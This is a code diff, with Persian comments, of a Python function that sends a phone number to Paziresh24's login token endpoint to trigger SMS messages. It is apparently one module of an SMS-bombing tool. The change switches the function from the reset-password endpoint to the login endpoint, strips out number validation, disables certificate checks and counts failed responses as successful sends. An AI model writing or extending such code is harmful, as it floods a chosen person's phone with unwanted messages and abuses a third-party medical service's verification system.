@@ -66,50 +66,44 @@ def send_service_safe(service, phone):
 
 def paziresh24(phone):
     try:
-        # پردازش شماره موبایل
+        # استفاده از فرمت 0912... برای پذیرش 24
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        
-        # بررسی فرمت شماره (باید 10 رقمی باشد)
-        if len(formatted_phone) != 10 or not formatted_phone.startswith('9'):
-            print("خطا: فرمت شماره نامعتبر است")
-            return False
-            
         formatted_phone = f"0{formatted_phone}"
-        print(f"شماره پردازش شده: {formatted_phone}")
         
-        # ارسال به API بازیابی رمز
         headers = {
             "Accept": "application/json, text/plain, */*",
             "accept-timezone": "Asia/Tehran",
             "content-type": "application/json; charset=utf-8",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Referer": "https://www.paziresh24.com/",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
         }
         
+        # payload برای لاگین (نه ثبت نام)
         payload = {
-            "mobile": formatted_phone
+            "username": formatted_phone,
+            "grant_type": "password"
         }
         
         response = requests.post(
-            "https://apigw.paziresh24.com/gozargah/resetpassword",
+            "https://apigw.paziresh24.com/gozargah/oauth/token",
             json=payload,
             headers=headers,
             timeout=10,
             verify=False
         )
         
-        print(f"paziresh24 Status: {response.status_code}")
-        print(f"paziresh24 Response: {response.text}")
+        print(f'{y}[Debug] paziresh24 Status: {response.status_code}{a}')
+        print(f'{y}[Debug] paziresh24 Response: {response.text}{a}')
         
-        if response.status_code == 200:
-            print("(paziresh24) reset password request sent!")
+        # حتی اگر خطای 400 بدهد، ممکنه SMS ارسال شده باشد
+        if response.status_code in [200, 400]:
+            print(f'{g}(paziresh24) login request sent!{a}')
             return True
         else:
-            print(f"paziresh24 error: {response.status_code}")
+            print(f'{r}[-] paziresh24 error: {response.status_code}{a}')
             return False
             
     except Exception as e:
-        print(f"paziresh24 exception: {e}")
+        print(f'{r}[!] paziresh24 exception: {e}{a}')
         return False
         
         
